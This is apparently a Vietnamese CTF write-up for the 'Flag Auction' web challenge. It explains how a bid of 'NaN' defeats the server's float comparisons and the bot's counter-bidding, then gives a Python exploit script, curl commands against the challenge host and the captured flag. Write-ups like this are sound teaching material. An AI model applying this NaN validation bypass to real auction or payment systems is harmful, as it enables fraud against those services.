# 📑 Writeup Challenge *Flag Auction (Web CTF)*

## Phân tích

* Source server (`main.py`) cho thấy đây là một sàn đấu giá nhiều item, trong đó có **item\_id = 2** chứa flag.

* Người chơi gửi bid qua `/bid`. Code parse `bid` bằng `float(...)`.

* Các điều kiện kiểm tra:

  ```python
  if bid <= item["highest_bid"]: return "Too low"
  if bid > users[user_id].value: return "Not enough money"
  ```

  → Với `NaN` (`float("NaN")`), cả hai so sánh này đều trả về `False`.

* Sau đó, server gán:

  ```python
  item["highest_bid"] = bid
  item["highest_bidder_uuid"] = user_id
  ```

  → Tức là bạn trở thành highest bidder cho item flag.

* Bot trong game chỉ bid khi `currentbid < self.value`. Nhưng với NaN, so sánh `<` luôn trả về `False`.
  → Bot không thể outbid bạn.

* Khi `end_auction()` chạy sau `time_limit` (100 giây), flag sẽ được thêm vào inventory của `highest_bidder_uuid`.

* `/inventory` hiển thị tất cả item bạn thắng → chứa flag.

## Khai thác

1. Gửi request đến `/register` để nhận cookie phiên.
2. Gửi bid NaN cho item flag (`item_id=2`).
3. Chờ kết thúc phiên.
4. Truy cập `/inventory` để thấy flag.

---

# 🐍 Script Python tự động

```python
import time
import requests

HOST = "http://34.44.129.8:57316"

s = requests.Session()

print("[*] Registering new user...")
s.get(f"{HOST}/register")

print("[*] Sending NaN bid for item 2 (flag)...")
s.post(f"{HOST}/bid", data={"item_id": "2", "bid": "NaN"})

print("[*] Polling inventory until flag appears...")
while True:
    resp = s.get(f"{HOST}/inventory")
    if "LITCTF{" in resp.text:
        print("[+] FLAG FOUND!")
        print(resp.text)
        break
    else:
        time.sleep(5)
```

Chạy script này → sau \~110 giây, output HTML sẽ chứa flag trong inventory.

---

# Khai thác thủ công bằng `curl`
```bash
zenniskayy@ZennisKayy:~$ curl -b cookies.txt -c cookies.txt http://34.44.129.8:57315/register >/dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   195  100   195    0     0    423      0 --:--:-- --:--:-- --:--:--   423
zenniskayy@ZennisKayy:~$ curl -b cookies.txt -X POSThttp://34.44.129.8:57315/bid -d "item_id=2&bid=NaN"
curl: (2) no URL specified
curl: try 'curl --help' or 'curl --manual' for more information
zenniskayy@ZennisKayy:~$ curl -b cookies.txt -X POST http://34.44.129.8:57315/bid -d "item_id=2&bid=NaN"
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
zenniskayy@ZennisKayy:~$ curl -b cookies.txt http://34.44.129.8:57315/inventory
<!-- inventory.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Your Inventory</title>
</head>
<body>
    <h1>Your Won Items</h1>

        <ul>

                <li>LITCTF{we_shall_never_have_error_500_at_the_most_critical_times}</li>

        </ul>

</body>
</html>zenniskayy@ZennisKayy:~$
```

👉 Đây chính là **NaN poisoning attack**: lợi dụng hành vi so sánh đặc biệt của NaN để “khóa” đấu giá và giữ ngôi cao nhất, từ đó nhận flag.

---
